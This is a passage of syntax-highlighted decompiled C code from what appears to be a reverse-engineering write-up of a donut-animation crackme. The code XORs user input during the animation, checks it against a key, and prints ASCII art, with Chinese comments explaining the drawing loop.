&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v8&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v8&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v8));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v46));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v9&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v9&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v9));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v46));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v10&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v10&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v10));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v33) &lt;span style="color:#f92672">-&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v35);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> (((v31 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">30.0&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (((v30 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">-&lt;/span> (v27 &lt;span style="color:#f92672">*&lt;/span> v28))) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">40.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> (((v31 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">15.0&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> ((v27 &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">+&lt;/span> ((v30 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v28))) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v25 &lt;span style="color:#f92672">+&lt;/span> v26;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v23 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">8.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span> ((((((v34 &lt;span style="color:#f92672">*&lt;/span> v35) &lt;span style="color:#f92672">-&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">-&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v35)) &lt;span style="color:#f92672">-&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">-&lt;/span> ((v30 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v28)));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v25 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v25 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v26 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v26 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">79&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v31 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v20[v24] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20[v24] &lt;span style="color:#f92672">=&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v23;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v23 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s[v24] &lt;span style="color:#f92672">=&lt;/span> special_char[v11]; &lt;span style="color:#f92672">//&lt;/span> special_char就是印出甜甜圈的素材
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v40 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v42 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0x3FF&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> v24 &lt;span style="color:#f92672">^&lt;/span> v23 &lt;span style="color:#f92672">^&lt;/span> (v26 &lt;span style="color:#f92672">+&lt;/span> v25);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> v42&lt;span style="color:#f92672">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(user_input &lt;span style="color:#f92672">+&lt;/span> v12) &lt;span style="color:#f92672">^=&lt;/span> v24 &lt;span style="color:#f92672">^&lt;/span> v23 &lt;span style="color:#f92672">^&lt;/span> (v26 &lt;span style="color:#f92672">+&lt;/span> v25);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v40;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> k &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.02&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.07000000000000001&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x1B&lt;/span>&lt;span style="color:#e6db74">[H&amp;#34;&lt;/span>); &lt;span style="color:#f92672">//&lt;/span> 這個代表游標回到home position
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( idx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; idx &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0x6E0&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>idx ) &lt;span style="color:#f92672">//&lt;/span> 這一段for loop就是在印出甜甜圈
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( idx &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> s[idx];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> putchar(v15);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> v47 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.00004&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> v16;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v17 &lt;span style="color:#f92672">=&lt;/span> v46 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.00002&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v46 &lt;span style="color:#f92672">=&lt;/span> v17;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usleep(&lt;span style="color:#ae81ff">30000&lt;/span>u); &lt;span style="color:#f92672">//&lt;/span> 睡眠0&lt;span style="color:#ae81ff">.03&lt;/span>秒
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher_1 &lt;span style="color:#f92672">=&lt;/span> verification(user_input, &lt;span style="color:#ae81ff">0x400&lt;/span>uLL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher_2 &lt;span style="color:#f92672">=&lt;/span> verification(key, &lt;span style="color:#ae81ff">0x400&lt;/span>uLL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( cipher_1 &lt;span style="color:#f92672">==&lt;/span> cipher_2 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Donut likes your input!! :D&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Donut Reject You!! :(&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;No matter donut accept you or not. Here&amp;#39;s a bananacat for you&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(icon);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">112&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">232&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">352&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">480&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">600&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">728&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">856&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">992&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">1128&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">1272&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▓▒▒▒▒▒░░░░░░░░░░▒▒▒▓▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
